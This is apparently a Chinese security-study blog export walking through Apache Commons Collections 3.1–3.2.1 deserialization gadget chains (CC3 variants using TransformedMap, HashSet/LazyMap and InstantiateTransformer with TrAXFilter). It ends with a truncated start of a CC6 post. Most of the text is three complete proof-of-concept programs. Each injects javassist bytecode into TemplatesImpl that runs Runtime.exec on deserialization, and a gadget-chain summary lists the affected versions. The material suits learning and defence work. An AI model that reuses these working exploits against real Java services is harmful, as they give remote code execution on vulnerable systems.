<h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(impl),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedmap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>, chain);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Target.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span></span><br><span class="line">        Exception &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                    field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无他,唯手熟尔,不行就cv慢慢看吧</p>
<h1 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h1><p>但是这样肯定有版本限制8u71就不行了,前面学了c6链想想,我该怎么办</p>
<p>对头,还是只需要该transform那部分就行了,这样就通杀3.1-3.2.1版本了，直接写,但其实c6链就够简洁了吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(impl),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">fuck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashmap,fuck);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(entry);</span><br><span class="line">        Field f=lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(lazyMap,chain);</span><br><span class="line">        lazyMap.clear();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashSet);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span></span><br><span class="line">        Exception &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                    field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是那句话处理好细节</p>
<p>就当熟悉以前的链子吧</p>
<h1 id="InstantiateTransformer-1"><a href="#InstantiateTransformer-1" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h1><p>安照前提知识,其实就知道很搞了,主要部分写出来就行了,按照这个也能弄把上面搞了,主要用InstantiateTransformer类来获取TrAXFilter类的getConstructor获取构造器再实例化就行了，来看看InstantiateTransformer怎么用吧,就得先看他的构造方法吧，有2个,肯定用public了呀还不用反射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">InstantiateTransformer</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>();</span><br><span class="line">      iParamTypes = <span class="literal">null</span>;</span><br><span class="line">      iArgs = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>();</span><br><span class="line">      iParamTypes = paramTypes;</span><br><span class="line">      iArgs = args;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>来看看利用点transform</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes)</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure>

<p>发现iArgs是我们需要传入初始化变量,而iParamTypes是参数类型,所以上面input直接为TrAXFilter.class就行了,而且构造方法不能要所以直接看TrAXFilter的构造方法 只有这一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>所以这里iArges变量就是Templates的一个对象,想要利用就用impl那个类</p>
<p>所以transform就出来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>&#123;impl&#125;)</span><br></pre></td></tr></table></figure>

<p>所以用c1的怎么都行，重点是怎么把input参数传进去的<br>只是改了Transform那个的变量就行了，比起c1链不如用c6链的，java8也能用,但是思考一下不能类的条件会发生什么呢，想了想就在input上了,后面进入链子的区别呢</p>
<p>先看Layzmap吧怎么进入的吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">factory.transform(key)</span><br></pre></td></tr></table></figure>

<p>这里传入的key就是input,就看之前怎么传入的如果是AnnotationInvocationHandler类,其实起一次key因为要触发invoke进来怎么这个key都是entryset()，自己想想写了这么久的c1链了是不是 ,所以想用怎么都是 用到那个chain链了,这样才能串一起</p>
<p>那hashset呢,来看看里面TiedMapEntry类怎么触发lazymap的get方法的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> map.get(key);</span><br></pre></td></tr></table></figure>

<p>发现传入值key其实是TiedMapEntry的key,所以可以不用chain类那样了,只用一个InstantiateTransformer类就行把这里的key设置为TrAXFilter.class就行了,其实这个也没必要,emmm,应要说就是减少点代码量了.思考的时候突然想到了</p>
<p>所以初始化TiedMapEntry可以变变,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">enrty</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,TrAXFilter.class))</span><br></pre></td></tr></table></figure>

<p>那TransformedMap呢可以怎么变呢?也可以控制嘛?我有答案呢其实这个都不重要</p>
<p>所以直接写poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;impl&#125;);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">fakeChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap,fakeChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,TrAXFilter.class);</span><br><span class="line">        set.add(entry);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(map,transformer);</span><br><span class="line">        map.clear();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(set);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span></span><br><span class="line">        Exception &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                    field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思考了为什么不能用其他方法来动态加载类，用c1链方法的思路都差不多所以不写了</p>
<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet.readObject()-&gt;</span><br><span class="line">    HashMap.put()-&gt;</span><br><span class="line">    	HashMap.putVal-&gt;</span><br><span class="line">    		TiedMapEntry.hashcode()-&gt;</span><br><span class="line">                TiedMapEntry.getValue()-&gt;</span><br><span class="line">                    Lazymap.get()-&gt;</span><br><span class="line">                        InstantiateTransformer.transformer()-&gt;</span><br><span class="line">                        	TrAXFilter.TrAXFilter()-&gt;</span><br><span class="line">    							 TemplatesImpl-&gt;....</span><br></pre></td></tr></table></figure>



<h1 id="依赖版本"><a href="#依赖版本" class="headerlink" title="依赖版本"></a>依赖版本</h1><p>commons-collections : 3.1～3.2.1</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链6</title>
    <url>/2023/07/13/cc6/</url>
    <content><![CDATA[<h1 id="前⾔"><a href="#前⾔" class="headerlink" title="前⾔"></a>前⾔</h1><p>在JDK 8u65以后，官⽅修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject⽅法，导致在⾼版本的Java中 CommonCollections1⽆法利⽤</p>
<p>于是我看了看里面改了什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readFields();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">var4</span> <span class="operator">=</span> (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var6</span> <span class="operator">=</span> var5.memberTypes();</span><br><span class="line">    <span class="type">LinkedHashMap</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 